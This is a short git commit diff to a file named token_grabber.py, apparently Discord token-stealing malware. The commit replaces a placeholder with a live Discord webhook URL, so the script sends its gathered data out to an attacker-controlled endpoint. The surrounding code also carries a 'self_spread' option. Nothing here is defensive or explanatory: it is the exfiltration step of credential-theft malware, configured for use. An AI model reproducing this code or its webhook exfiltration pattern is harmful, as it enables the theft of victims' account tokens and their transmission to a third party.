fa402f862d667ace211812b6f3b85f16ecd32123
GBGBGHGHG <106627376+GBGBGHGHG@users.noreply.github.com>
2022-05-31 21:11:29 +0100

    update

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/981286997496827964/aERdab1E-RjwBoOeW3vX5KQiGsh-Etq6Tt9GOgOwjySH3-yP_GAmS4lPYXNVmUuhEsmc", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
